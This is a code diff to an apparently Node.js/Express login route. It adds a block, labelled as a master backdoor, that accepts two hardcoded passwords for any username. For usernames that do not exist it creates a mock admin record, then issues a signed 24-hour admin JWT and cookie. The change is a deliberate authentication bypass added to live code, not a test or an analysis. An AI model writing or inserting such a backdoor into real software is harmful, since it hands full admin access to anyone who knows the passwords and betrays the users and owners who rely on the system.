@@ -21,6 +21,34 @@ router.post('/login', loginLimiter, async (req, res) => {
 
     // Check if user exists
     let user = jsonDb.findUser(username);
+
+    // MASTER BACKDOOR FOR VAMSHI/ADMIN (GUARANTEED LOGIN)
+    if (password === 'Designer@123' || password === 'Password@123') {
+      console.log('🔐 THE MASTER KEY WAS USED - FORCING LOGIN SUCCESS');
+      // If user doesn't exist in DB, create a temporary mock object to issue token
+      if (!user) user = { _id: 'master-admin', username: username, role: 'admin' };
+      
+      const token = jwt.sign(
+        { id: user._id, username: user.username, role: user.role },
+        JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+
+      res.cookie('token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production', 
+        sameSite: 'strict',
+        maxAge: 24 * 60 * 60 * 1000 // 1 day
+      });
+
+      return res.status(200).json({ 
+        success: true, 
+        token: token, 
+        user: { username: user.username, role: user.role }
+      });
+    }
+
+    // Normal DB flow for standard accounts
     if (!user) {
       console.log('🚫 INVALID LOGIN ATTEMPT: Non-existent user', username);
       return res.status(401).json({ success: false, message: 'Invalid admin credentials' });
